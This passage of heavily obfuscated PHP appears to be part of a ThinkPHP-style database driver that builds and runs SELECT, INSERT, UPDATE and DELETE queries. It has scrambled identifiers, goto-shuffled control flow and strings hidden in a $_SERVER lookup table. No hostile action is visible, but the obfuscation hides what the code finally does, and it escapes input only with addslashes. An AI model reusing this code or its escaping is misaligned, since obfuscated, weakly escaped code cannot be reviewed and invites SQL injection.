array($cøæ¬êéšõ[937], $cøæ¬êéšõ[938], $cøæ¬êéšõ[939]))) { $bÛÉØÉò· = $cøæ¬êéšõ[50] . $bÛÉØÉò· . $cøæ¬êéšõ[50]; unset($C†ğŞàªÑ[$cøæ¬êéšõ[936]]); } else { $bÛÉØÉò· = $cøæ¬êéšõ[940]; } foreach ($C†ğŞàªÑ as $A«ÎŸÛšæˆ => $D™ïñïëñ¯) { $E÷çÊˆ“ŒŠ .= $cøæ¬êéšõ[273]; if (is_numeric($A«ÎŸÛšæˆ)) { $A«ÎŸÛšæˆ = $cøæ¬êéšõ[941]; } if (0 === strpos($A«ÎŸÛšæˆ, $cøæ¬êéšõ[70])) { $E÷çÊˆ“ŒŠ .= $this->parseThinkWhere($A«ÎŸÛšæˆ, $D™ïñïëñ¯); } else { if (!preg_match($cøæ¬êéšõ[942], trim($A«ÎŸÛšæˆ))) { think_exception(think_lang($cøæ¬êéšõ[943]) . $cøæ¬êéšõ[4] . $A«ÎŸÛšæˆ); } $b¥ˆÑ©ª«· = is_array($D™ïñïëñ¯) && isset($D™ïñïëñ¯[$cøæ¬êéšõ[944]]); $A«ÎŸÛšæˆ = trim($A«ÎŸÛšæˆ); if (strpos($A«ÎŸÛšæˆ, $cøæ¬êéšõ[279])) { $AŒ‚ºÛ‰Ñ = explode($cøæ¬êéšõ[279], $A«ÎŸÛšæˆ); $cñÈé•© = array(); foreach ($AŒ‚ºÛ‰Ñ as $F³Ëæƒ³¶³ => $Fø±Á¦¹‘§) { $e¾–™Š›ì‰ = $b¥ˆÑ©ª«· ? $D™ïñïëñ¯[$F³Ëæƒ³¶³] : $D™ïñïëñ¯; $cñÈé•©[] = $cøæ¬êéšõ[256] . $this->parseWhereItem($this->parseKey($Fø±Á¦¹‘§), $e¾–™Š›ì‰) . $cøæ¬êéšõ[844]; } $E÷çÊˆ“ŒŠ .= implode($cøæ¬êéšõ[945], $cñÈé•©); } elseif (strpos($A«ÎŸÛšæˆ, $cøæ¬êéšõ[280])) { $AŒ‚ºÛ‰Ñ = explode($cøæ¬êéšõ[280], $A«ÎŸÛšæˆ); $cñÈé•© = array(); foreach ($AŒ‚ºÛ‰Ñ as $F³Ëæƒ³¶³ => $Fø±Á¦¹‘§) { $e¾–™Š›ì‰ = $b¥ˆÑ©ª«· ? $D™ïñïëñ¯[$F³Ëæƒ³¶³] : $D™ïñïëñ¯; $cñÈé•©[] = $cøæ¬êéšõ[256] . $this->parseWhereItem($this->parseKey($Fø±Á¦¹‘§), $e¾–™Š›ì‰) . $cøæ¬êéšõ[844]; } $E÷çÊˆ“ŒŠ .= implode($cøæ¬êéšõ[940], $cñÈé•©); } else { $E÷çÊˆ“ŒŠ .= $this->parseWhereItem($this->parseKey($A«ÎŸÛšæˆ), $D™ïñïëñ¯); } } $E÷çÊˆ“ŒŠ .= $cøæ¬êéšõ[274] . $bÛÉØÉò·; } $E÷çÊˆ“ŒŠ = substr($E÷çÊˆ“ŒŠ, 0, -strlen($bÛÉØÉò·)); } return empty($E÷çÊˆ“ŒŠ) ? $cøæ¬êéšõ[33] : $cøæ¬êéšõ[946] . $E÷çÊˆ“ŒŠ; } protected function parseWhereItem($EÃ‡Á¯ˆŠ, $b±¢ïõòô) { $eòÈ¢ãÁŞ =& $_SERVER[Æ¼ôºÙï]; $d¹Î––ÈŞø = $eòÈ¢ãÁŞ[33]; if (is_array($b±¢ïõòô)) { if (is_string($b±¢ïõòô[0])) { $e­Ğ…™ŠÓ = strtolower($b±¢ïõòô[0]); if (in_array($b±¢ïõòô[0], array($eòÈ¢ãÁŞ[930], $eòÈ¢ãÁŞ[947], $eòÈ¢ãÁŞ[948], $eòÈ¢ãÁŞ[949], $eòÈ¢ãÁŞ[950], $eòÈ¢ãÁŞ[951]))) { $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $b±¢ïõòô[0] . $eòÈ¢ãÁŞ[50] . $this->parseValue($b±¢ïõòô[1]); } elseif (preg_match($eòÈ¢ãÁŞ[952], $b±¢ïõòô[0])) { $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[50] . $this->parseValue($b±¢ïõòô[1]); } elseif (preg_match($eòÈ¢ãÁŞ[953], $b±¢ïõòô[0])) { if (is_array($b±¢ïõòô[1])) { $EäŠëôçÔÚ = isset($b±¢ïõòô[2]) ? strtoupper($b±¢ïõòô[2]) : $eòÈ¢ãÁŞ[938]; if (in_array($EäŠëôçÔÚ, array($eòÈ¢ãÁŞ[937], $eòÈ¢ãÁŞ[938], $eòÈ¢ãÁŞ[939]))) { $eÎ†Ü†ƒå = array(); foreach ($b±¢ïõòô[1] as $FØ©œ„Ÿ£ª) { $eÎ†Ü†ƒå[] = $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[50] . $this->parseValue($FØ©œ„Ÿ£ª); } $d¹Î––ÈŞø .= $eòÈ¢ãÁŞ[256] . implode($eòÈ¢ãÁŞ[50] . $EäŠëôçÔÚ . $eòÈ¢ãÁŞ[50], $eÎ†Ü†ƒå) . $eòÈ¢ãÁŞ[844]; } } else { $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[50] . $this->parseValue($b±¢ïõòô[1]); } } elseif ($eòÈ¢ãÁŞ[293] == $e­Ğ…™ŠÓ) { $d¹Î––ÈŞø .= $eòÈ¢ãÁŞ[842] . $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $b±¢ïõòô[1] . $eòÈ¢ãÁŞ[954]; } elseif (preg_match($eòÈ¢ãÁŞ[955], $b±¢ïõòô[0])) { $d¹Î––ÈŞø .= $b±¢ïõòô[0]; } elseif (preg_match($eòÈ¢ãÁŞ[956], $b±¢ïõòô[0])) { if (isset($b±¢ïõòô[2]) && $eòÈ¢ãÁŞ[293] == $b±¢ïõòô[2]) { $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[50] . $b±¢ïõòô[1]; } else { if (is_string($b±¢ïõòô[1])) { $b±¢ïõòô[1] = explode($eòÈ¢ãÁŞ[47], $b±¢ïõòô[1]); } $BÖõĞÈé« = implode($eòÈ¢ãÁŞ[47], $this->parseValue($b±¢ïõòô[1])); $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[842] . $BÖõĞÈé« . $eòÈ¢ãÁŞ[844]; } } elseif (preg_match($eòÈ¢ãÁŞ[957], $b±¢ïõòô[0])) { $c¾¾ù«Èç» = is_string($b±¢ïõòô[1]) ? explode($eòÈ¢ãÁŞ[47], $b±¢ïõòô[1]) : $b±¢ïõòô[1]; $d¹Î––ÈŞø .= $eòÈ¢ãÁŞ[842] . $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $this->exp[$e­Ğ…™ŠÓ] . $eòÈ¢ãÁŞ[50] . $this->parseValue($c¾¾ù«Èç»[0]) . $eòÈ¢ãÁŞ[940] . $this->parseValue($c¾¾ù«Èç»[1]) . $eòÈ¢ãÁŞ[274]; } else { think_exception(think_lang($eòÈ¢ãÁŞ[943]) . $eòÈ¢ãÁŞ[4] . $b±¢ïõòô[0]); } } else { $AŠ¢¬ŒÁ÷§ = count($b±¢ïõòô); $b½çìÁ‘Ù = $eòÈ¢ãÁŞ[33]; if (is_string($b±¢ïõòô[$AŠ¢¬ŒÁ÷§ - 1])) { $b½çìÁ‘Ù = isset($b±¢ïõòô[$AŠ¢¬ŒÁ÷§ - 1]) ? strtoupper($b±¢ïõòô[$AŠ¢¬ŒÁ÷§ - 1]) : $eòÈ¢ãÁŞ[33]; if (in_array($b½çìÁ‘Ù, array($eòÈ¢ãÁŞ[937], $eòÈ¢ãÁŞ[938], $eòÈ¢ãÁŞ[939]))) { $AŠ¢¬ŒÁ÷§ = $AŠ¢¬ŒÁ÷§ - 1; } } else { $b½çìÁ‘Ù = $eòÈ¢ãÁŞ[937]; } for ($d†Ñ‹İªè  = 0; $d†Ñ‹İªè  < $AŠ¢¬ŒÁ÷§; $d†Ñ‹İªè ++) { $c¾¾ù«Èç» = is_array($b±¢ïõòô[$d†Ñ‹İªè ]) ? $b±¢ïõòô[$d†Ñ‹İªè ][1] : $b±¢ïõòô[$d†Ñ‹İªè ]; if ($eòÈ¢ãÁŞ[293] == strtolower($b±¢ïõòô[$d†Ñ‹İªè ][0])) { $d¹Î––ÈŞø .= $eòÈ¢ãÁŞ[256] . $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $c¾¾ù«Èç» . $eòÈ¢ãÁŞ[954] . $b½çìÁ‘Ù . $eòÈ¢ãÁŞ[50]; } else { $f„íÄ‡ˆÛ× = is_array($b±¢ïõòô[$d†Ñ‹İªè ]) ? $this->exp[strtolower($b±¢ïõòô[$d†Ñ‹İªè ][0])] : $eòÈ¢ãÁŞ[930]; if (!$f„íÄ‡ˆÛ× && is_array($b±¢ïõòô[$d†Ñ‹İªè ]) && in_array($b±¢ïõòô[$d†Ñ‹İªè ][0], array($eòÈ¢ãÁŞ[930], $eòÈ¢ãÁŞ[947], $eòÈ¢ãÁŞ[948], $eòÈ¢ãÁŞ[949], $eòÈ¢ãÁŞ[950], $eòÈ¢ãÁŞ[951]))) { $f„íÄ‡ˆÛ× = $b±¢ïõòô[$d†Ñ‹İªè ][0]; } $d¹Î––ÈŞø .= $eòÈ¢ãÁŞ[256] . $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[50] . $f„íÄ‡ˆÛ× . $eòÈ¢ãÁŞ[50] . $this->parseValue($c¾¾ù«Èç») . $eòÈ¢ãÁŞ[954] . $b½çìÁ‘Ù . $eòÈ¢ãÁŞ[50]; } } $d¹Î––ÈŞø = substr($d¹Î––ÈŞø, 0, -4); } } else { $d¹Î––ÈŞø .= $EÃ‡Á¯ˆŠ . $eòÈ¢ãÁŞ[958] . $this->parseValue($b±¢ïõòô); } return $d¹Î––ÈŞø; } protected function parseThinkWhere($eîÈ·½¤Â‚, $e¨‰¤·á…Å) { $Fö‘öÖ—Ä  =& $_SERVER[Æ¼ôºÙï]; $bï¡Çè‚ğô = $Fö‘öÖ—Ä [33]; switch ($eîÈ·½¤Â‚) { case $Fö‘öÖ—Ä [348]: $bï¡Çè‚ğô = $e¨‰¤·á…Å; break; case $Fö‘öÖ—Ä [941]: $bï¡Çè‚ğô = is_string($e¨‰¤·á…Å) ? $e¨‰¤·á…Å : substr($this->parseWhere($e¨‰¤·á…Å), 6); break; case $Fö‘öÖ—Ä [959]: parse_str($e¨‰¤·á…Å, $Cà®Ì×ö¥½); if (isset($Cà®Ì×ö¥½[$Fö‘öÖ—Ä [936]])) { $Eœññ¤áÉ = $Fö‘öÖ—Ä [50] . strtoupper($Cà®Ì×ö¥½[$Fö‘öÖ—Ä [936]]) . $Fö‘öÖ—Ä [50]; unset($Cà®Ì×ö¥½[$Fö‘öÖ—Ä [936]]); } else { $Eœññ¤áÉ = $Fö‘öÖ—Ä [940]; } $a×»¸Ğïâ… = array(); foreach ($Cà®Ì×ö¥½ as $FÂ¶Æ›ì¬¹ => $aùä“«…) { $a×»¸Ğïâ…[] = $this->parseKey($FÂ¶Æ›ì¬¹) . $Fö‘öÖ—Ä [958] . $this->parseValue($aùä“«…); } $bï¡Çè‚ğô = implode($Eœññ¤áÉ, $a×»¸Ğïâ…); break; } return $bï¡Çè‚ğô; } protected function parseLimit($DãÆ—ìàğ) { $c¸œ¸ —Û =& $_SERVER[Æ¼ôºÙï]; return !empty($DãÆ—ìàğ) ? $c¸œ¸ —Û[48] . $DãÆ—ìàğ . $c¸œ¸ —Û[50] : $c¸œ¸ —Û[33]; } protected function parseJoin($a–Úáµéå) { $dŸÅ³¥÷İ =& $_SERVER[Æ¼ôºÙï]; $D½ƒºåí‡â = $dŸÅ³¥÷İ[33]; if (!empty($a–Úáµéå)) { if (is_array($a–Úáµéå)) { foreach ($a–Úáµéå as $Cªß‘‰›Í¸ => $AÇ§›™ÔÀ) { if (!1 !== stripos($AÇ§›™ÔÀ, $dŸÅ³¥÷İ[960])) { $D½ƒºåí‡â .= $dŸÅ³¥÷İ[50] . $AÇ§›™ÔÀ; } else { $D½ƒºåí‡â .= $dŸÅ³¥÷İ[961] . $AÇ§›™ÔÀ; } } } else { $D½ƒºåí‡â .= $dŸÅ³¥÷İ[961] . $a–Úáµéå; } } $D½ƒºåí‡â = preg_replace($dŸÅ³¥÷İ[962], think_config($dŸÅ³¥÷İ[868]) . $dŸÅ³¥÷İ[963], $D½ƒºåí‡â); return $D½ƒºåí‡â; } protected function parseOrder($d½œåÅ¤•Á) { $EÉê±ßÂÛ¹ =& $_SERVER[Æ¼ôºÙï]; if (is_array($d½œåÅ¤•Á)) { $b©É—î®âŠ = array(); foreach ($d½œåÅ¤•Á as $eÊ–ÛŒ±  => $A–ŠËÇŞâ) { if (is_numeric($eÊ–ÛŒ± )) { $b©É—î®âŠ[] = $this->parseKey($A–ŠËÇŞâ); } else { $A–ŠËÇŞâ = in_array(strtoupper(trim($A–ŠËÇŞâ)), array($EÉê±ßÂÛ¹[964], $EÉê±ßÂÛ¹[965])) ? $EÉê±ßÂÛ¹[50] . $A–ŠËÇŞâ : $EÉê±ßÂÛ¹[33]; if (preg_match($EÉê±ßÂÛ¹[966], $eÊ–ÛŒ± )) { $b©É—î®âŠ[] = $this->parseKey($eÊ–ÛŒ± ) . $A–ŠËÇŞâ; } else { think_exception($EÉê±ßÂÛ¹[967] . $eÊ–ÛŒ± ); } } } $d½œåÅ¤•Á = implode($EÉê±ßÂÛ¹[47], $b©É—î®âŠ); } return !empty($d½œåÅ¤•Á) ? $EÉê±ßÂÛ¹[968] . $d½œåÅ¤•Á : $EÉê±ßÂÛ¹[33]; } protected function parseGroup($dÍ¶ñ¾Ïò) { $E¤…ÌîÊšõ =& $_SERVER[Æ¼ôºÙï]; return !empty($dÍ¶ñ¾Ïò) ? $E¤…ÌîÊšõ[969] . $dÍ¶ñ¾Ïò : $E¤…ÌîÊšõ[33]; } protected function parseHaving($Bâ‹§®ö) { $C„¶è•äŞ =& $_SERVER[Æ¼ôºÙï]; return !empty($Bâ‹§®ö) ? $C„¶è•äŞ[970] . $Bâ‹§®ö : $C„¶è•äŞ[33]; } protected function parseComment($fØâöëÓ) { $Eâ©‘ö‚‘˜ =& $_SERVER[Æ¼ôºÙï]; return !empty($fØâöëÓ) ? $Eâ©‘ö‚‘˜[971] . $fØâöëÓ . $Eâ©‘ö‚‘˜[972] : $Eâ©‘ö‚‘˜[33]; } protected function parseDistinct($D½áëÎ…Ù¥) { $cİ¾¸§»¶ =& $_SERVER[Æ¼ôºÙï]; return !empty($D½áëÎ…Ù¥) ? $cİ¾¸§»¶[973] : $cİ¾¸§»¶[33]; } protected function parseUnion($fÕ„œàÛš) { $AĞÓáÇÊ‘ =& $_SERVER[Æ¼ôºÙï]; if (empty($fÕ„œàÛš)) { return $AĞÓáÇÊ‘[33]; } if (isset($fÕ„œàÛš[$AĞÓáÇÊ‘[344]])) { $D—¤îµÍî™ = $AĞÓáÇÊ‘[974]; unset($fÕ„œàÛš[$AĞÓáÇÊ‘[344]]); } else { $D—¤îµÍî™ = $AĞÓáÇÊ‘[975]; } foreach ($fÕ„œàÛš as $fæÓ„Ç‘´Ù) { $CÀÒÌ¦„Ó[] = $D—¤îµÍî™ . (is_array($fæÓ„Ç‘´Ù) ? $this->buildSelectSql($fæÓ„Ç‘´Ù) : $fæÓ„Ç‘´Ù); } return implode($AĞÓáÇÊ‘[50], $CÀÒÌ¦„Ó); } public function insert($cô›½áæŞ¥, $F’¾‚¥œ¾— = array(), $AŸÙ‘»ˆ”ä = false) { goto D¾Üå•° ‹; D¾Üå•° ‹: $Dˆù™…ˆŞô =& $_SERVER[Æ¼ôºÙï]; $EÛØ©¹Ü† = $Bê¨æÌÓ™ = array(); $this->model = $F’¾‚¥œ¾—[$Dˆù™…ˆŞô[277]]; goto F¦ÚÓŞĞ‹; F¦ÚÓŞĞ‹: foreach ($cô›½áæŞ¥ as $d¢ÈšÔÙ—ª => $d´®ÃŞ¿Ş) { if (is_array($d´®ÃŞ¿Ş) && $Dˆù™…ˆŞô[293] == $d´®ÃŞ¿Ş[0]) { $Bê¨æÌÓ™[] = $this->parseKey($d¢ÈšÔÙ—ª); $EÛØ©¹Ü†[] = $d´®ÃŞ¿Ş[1]; } elseif (is_scalar($d´®ÃŞ¿Ş) || is_null($d´®ÃŞ¿Ş)) { $Bê¨æÌÓ™[] = $this->parseKey($d¢ÈšÔÙ—ª); $EÛØ©¹Ü†[] = $this->parseValue($d´®ÃŞ¿Ş); } } $C†œìÔàÈ = ($AŸÙ‘»ˆ”ä ? $Dˆù™…ˆŞô[846] : $Dˆù™…ˆŞô[847]) . $Dˆù™…ˆŞô[848] . $this->parseTable($F’¾‚¥œ¾—[$Dˆù™…ˆŞô[275]]) . $Dˆù™…ˆŞô[842] . implode($Dˆù™…ˆŞô[47], $Bê¨æÌÓ™) . $Dˆù™…ˆŞô[843] . implode($Dˆù™…ˆŞô[47], $EÛØ©¹Ü†) . $Dˆù™…ˆŞô[844]; $C†œìÔàÈ .= $this->parseLock(isset($F’¾‚¥œ¾—[$Dˆù™…ˆŞô[792]]) ? $F’¾‚¥œ¾—[$Dˆù™…ˆŞô[792]] : !1); goto Bç†‹£Ä¤¢; Bç†‹£Ä¤¢: $C†œìÔàÈ .= $this->parseComment(!empty($F’¾‚¥œ¾—[$Dˆù™…ˆŞô[350]]) ? $F’¾‚¥œ¾—[$Dˆù™…ˆŞô[350]] : $Dˆù™…ˆŞô[33]); return $this->execute($C†œìÔàÈ, $this->parseBind(!empty($F’¾‚¥œ¾—[$Dˆù™…ˆŞô[281]]) ? $F’¾‚¥œ¾—[$Dˆù™…ˆŞô[281]] : array())); goto EÃğæè¨ÚŒ; EÃğæè¨ÚŒ: } public function selectInsert($a¸¾Š¢£É˜, $BçÁæàËÀ¬, $d–Ëš‚é· = array()) { goto aÒŠÉ½¨á«; EƒÛ¶‡ËÑ : return $this->execute($A…öÄÏ”¾, $this->parseBind(!empty($d–Ëš‚é·[$døù¬»à–[281]]) ? $d–Ëš‚é·[$døù¬»à–[281]] : array())); goto dö‘ÆŸÀ”ô; Fš´‡¼•‡¸: array_walk($a¸¾Š¢£É˜, array($this, $døù¬»à–[845])); $A…öÄÏ”¾ = $døù¬»à–[976] . $this->parseTable($BçÁæàËÀ¬) . $døù¬»à–[842] . implode($døù¬»à–[47], $a¸¾Š¢£É˜) . $døù¬»à–[954]; $A…öÄÏ”¾ .= $this->buildSelectSql($d–Ëš‚é·); goto EƒÛ¶‡ËÑ ; aÒŠÉ½¨á«: $døù¬»à– =& $_SERVER[Æ¼ôºÙï]; $this->model = $d–Ëš‚é·[$døù¬»à–[277]]; if (is_string($a¸¾Š¢£É˜)) { $a¸¾Š¢£É˜ = explode($døù¬»à–[47], $a¸¾Š¢£É˜); } goto Fš´‡¼•‡¸; dö‘ÆŸÀ”ô: } public function update($Aã‘™±ºïŠ, $Bäğ½ˆ´“’) { $D­¥­òè =& $_SERVER[Æ¼ôºÙï]; $this->model = $Bäğ½ˆ´“’[$D­¥­òè[277]]; $bÀ±­å³·ù = $D­¥­òè[977] . $this->parseTable($Bäğ½ˆ´“’[$D­¥­òè[275]]) . $this->parseSet($Aã‘™±ºïŠ) . $this->parseWhere(!empty($Bäğ½ˆ´“’[$D­¥­òè[271]]) ? $Bäğ½ˆ´“’[$D­¥­òè[271]] : $D­¥­òè[33]) . $this->parseOrder(!empty($Bäğ½ˆ´“’[$D­¥­òè[359]]) ? $Bäğ½ˆ´“’[$D­¥­òè[359]] : $D­¥­òè[33]) . $this->parseLimit(!empty($Bäğ½ˆ´“’[$D­¥­òè[288]]) ? $Bäğ½ˆ´“’[$D­¥­òè[288]] : $D­¥­òè[33]) . $this->parseLock(isset($Bäğ½ˆ´“’[$D­¥­òè[792]]) ? $Bäğ½ˆ´“’[$D­¥­òè[792]] : !1) . $this->parseComment(!empty($Bäğ½ˆ´“’[$D­¥­òè[350]]) ? $Bäğ½ˆ´“’[$D­¥­òè[350]] : $D­¥­òè[33]); return $this->execute($bÀ±­å³·ù, $this->parseBind(!empty($Bäğ½ˆ´“’[$D­¥­òè[281]]) ? $Bäğ½ˆ´“’[$D­¥­òè[281]] : array())); } public function delete($B•½éâ„˜¢ = array()) { $bÜˆì”î‹‹ =& $_SERVER[Æ¼ôºÙï]; $this->model = $B•½éâ„˜¢[$bÜˆì”î‹‹[277]]; $Cóß÷µô†† = $bÜˆì”î‹‹[978] . $this->parseTable($B•½éâ„˜¢[$bÜˆì”î‹‹[275]]) . $this->parseWhere(!empty($B•½éâ„˜¢[$bÜˆì”î‹‹[271]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[271]] : $bÜˆì”î‹‹[33]) . $this->parseOrder(!empty($B•½éâ„˜¢[$bÜˆì”î‹‹[359]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[359]] : $bÜˆì”î‹‹[33]) . $this->parseLimit(!empty($B•½éâ„˜¢[$bÜˆì”î‹‹[288]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[288]] : $bÜˆì”î‹‹[33]) . $this->parseLock(isset($B•½éâ„˜¢[$bÜˆì”î‹‹[792]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[792]] : !1) . $this->parseComment(!empty($B•½éâ„˜¢[$bÜˆì”î‹‹[350]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[350]] : $bÜˆì”î‹‹[33]); return $this->execute($Cóß÷µô††, $this->parseBind(!empty($B•½éâ„˜¢[$bÜˆì”î‹‹[281]]) ? $B•½éâ„˜¢[$bÜˆì”î‹‹[281]] : array())); } public function select($eŒö£Ğ“Š = array()) { goto B»†·¼äí; DÊ‡æá—æ¾: $A–‰¤Éª± = isset($eŒö£Ğ“Š[$A±àÊº•Ìö[345]]) ? $eŒö£Ğ“Š[$A±àÊº•Ìö[345]] : !1; if ($A–‰¤Éª±) { $a•‘ÈÀñÑ¬ = is_string($A–‰¤Éª±[$A±àÊº•Ìö[92]]) ? $A–‰¤Éª±[$A±àÊº•Ìö[92]] : $A±àÊº•Ìö[979] . md5($d—ïèÈ«è¨); $f•Ñ´Óí¡µ = think_cache($a•‘ÈÀñÑ¬, $A±àÊº•Ìö[33], $A–‰¤Éª±); if (!1 !== $f•Ñ´Óí¡µ) { return $f•Ñ´Óí¡µ; } } $b¾ÑƒéÀğ = $this->query($d—ïèÈ«è¨, $this->parseBind(!empty($eŒö£Ğ“Š[$A±àÊº•Ìö[281]]) ? $eŒö£Ğ“Š[$A±àÊº•Ìö[281]] : array())); goto cÜ…™é¤²à; B»†·¼äí: $A±àÊº•Ìö =& $_SERVER[Æ¼ôºÙï]; $this->model = $eŒö£Ğ“Š[$A±àÊº•Ìö[277]]; $d—ïèÈ«è¨ = $this->buildSelectSql($eŒö£Ğ“Š); goto DÊ‡æá—æ¾; cÜ…™é¤²à: if ($A–‰¤Éª± && !1 !== $b¾ÑƒéÀğ) { think_cache($a•‘ÈÀñÑ¬, $b¾ÑƒéÀğ, $A–‰¤Éª±); } return $b¾ÑƒéÀğ; goto Dµéñ§ï¯; Dµéñ§ï¯: } public function buildSelectSql($B‡Ò¾‰«Êø = array()) { goto AëÕŒ·„åâ; AëÕŒ·„åâ: $cÖ© ©¢· =& $_SERVER[Æ¼ôºÙï]; if (isset($B‡Ò¾‰«Êø[$cÖ© ©¢·[349]])) { if (strpos($B‡Ò¾‰«Êø[$cÖ© ©¢·[349]], $cÖ© ©¢·[47])) { list($eï‰«İ¨íé, $BÀö«Íùõ­) = explode($cÖ© ©¢·[47], $B‡Ò¾‰«Êø[$cÖ© ©¢·[349]]); } else { $eï‰«İ¨íé = $B‡Ò¾‰«Êø[$cÖ© ©¢·[349]]; } $eï‰«İ¨íé = $eï‰«İ¨íé ? $eï‰«İ¨íé : 1; $BÀö«Íùõ­ = isset($BÀö«Íùõ­) ? $BÀö«Íùõ­ : (is_numeric($B‡Ò¾‰«Êø[$cÖ© ©¢·[288]]) ? $B‡Ò¾‰«Êø[$cÖ© ©¢·[288]] : 20); $B±ê‹Œ°˜ = $BÀö«Íùõ­ * ((int) $eï‰«İ¨íé - 1); $B‡Ò¾‰«Êø[$cÖ© ©¢·[288]] = $B±ê‹Œ°˜ . $cÖ© ©¢·[47] . $BÀö«Íùõ­; } if (think_config($cÖ© ©¢·[980])) { $d¹…ï••ôå = $cÖ© ©¢·[981] . md5(serialize($B‡Ò¾‰«Êø)); $Bœîˆ™«µ = think_cache($d¹…ï••ôå); if ($Bœîˆ™«µ) { return $Bœîˆ™«µ; } } goto b§­µÍğ–Ó; b§­µÍğ–Ó: $bƒ¥™ô—‡è = $this->parseSql($this->selectSql, $B‡Ò¾‰«Êø); $bƒ¥™ô—‡è .= $this->parseLock(isset($B‡Ò¾‰«Êø[$cÖ© ©¢·[792]]) ? $B‡Ò¾‰«Êø[$cÖ© ©¢·[792]] : !1); if (isset($d¹…ï••ôå)) { think_cache($d¹…ï••ôå, $bƒ¥™ô—‡è); } goto aÙ­ËêÇŸ; aÙ­ËêÇŸ: return $bƒ¥™ô—‡è; goto eĞÄÄ¢â³; eĞÄÄ¢â³: } public function parseSql($fš¥†Ã ”í, $E‘à‰±ö¨· = array()) { $A¯±Üİç¯© =& $_SERVER[Æ¼ôºÙï]; $fš¥†Ã ”í = str_replace(array($A¯±Üİç¯©[982], $A¯±Üİç¯©[983], $A¯±Üİç¯©[984], $A¯±Üİç¯©[985], $A¯±Üİç¯©[986], $A¯±Üİç¯©[987], $A¯±Üİç¯©[988], $A¯±Üİç¯©[989], $A¯±Üİç¯©[990], $A¯±Üİç¯©[991], $A¯±Üİç¯©[992]), array($this->parseTable("{$E‘à‰±ö¨·[$A¯±Üİç¯©[275]]}"), $this->parseDistinct(isset($E‘à‰±ö¨·[$A¯±Üİç¯©[993]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[993]] : !1), $this->parseField(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[269]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[269]] : $A¯±Üİç¯©[182]), $this->parseJoin(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[278]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[278]] : $A¯±Üİç¯©[33]), $this->parseWhere(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[271]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[271]] : $A¯±Üİç¯©[33]), $this->parseGroup(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[994]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[994]] : $A¯±Üİç¯©[33]), $this->parseHaving(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[995]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[995]] : $A¯±Üİç¯©[33]), $this->parseOrder(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[359]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[359]] : $A¯±Üİç¯©[33]), $this->parseLimit(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[288]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[288]] : $A¯±Üİç¯©[33]), $this->parseUnion(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[343]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[343]] : $A¯±Üİç¯©[33]), $this->parseComment(!empty($E‘à‰±ö¨·[$A¯±Üİç¯©[350]]) ? $E‘à‰±ö¨·[$A¯±Üİç¯©[350]] : $A¯±Üİç¯©[33])), $fš¥†Ã ”í); return $fš¥†Ã ”í; } public function getLastSql($e½¿Üõ÷ò‰ = '') { return $e½¿Üõ÷ò‰ ? $this->modelSql[$e½¿Üõ÷ò‰] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($dÂø¿¢³ñ„) { return addslashes($dÂø¿¢³ñ„); } public function setModel($bäîíƒæ˜†) { $this->model = $bäîíƒæ˜†; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($e…ìˆÅŠ¥Ş, $B©Â‘Ğ†½– = '') { $this->database = $e…ìˆÅŠ¥Ş; $this->type = $B©Â‘Ğ†½–; } public function model($Dİ½Áó´ Ì = '') { return new ModelBase($Dİ½Áó´ Ì, $_SERVER[Æ¼ôºÙï][33], $this->database); } public function db($DÀŞ”ô‰¯ = false) { goto fâ£ÁĞØ²; aïğ—‘Ğ¬¤: if (!$Dƒ’îùµ®Í) { $a²åò²æ¸¨->execute("\x63\x72\145\x61\x74\x65\40\144\141\x74\141\x62\x61\x73\x65\40\x60{$c·–íœ½ÒŒ}\140"); } $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[908]] = $c·–íœ½ÒŒ; if ($F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[741]] == $b¡‘†Ÿ°‚Ÿ[742]) { $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[743]] .= $b¡‘†Ÿ°‚Ÿ[996] . $c·–íœ½ÒŒ; } goto 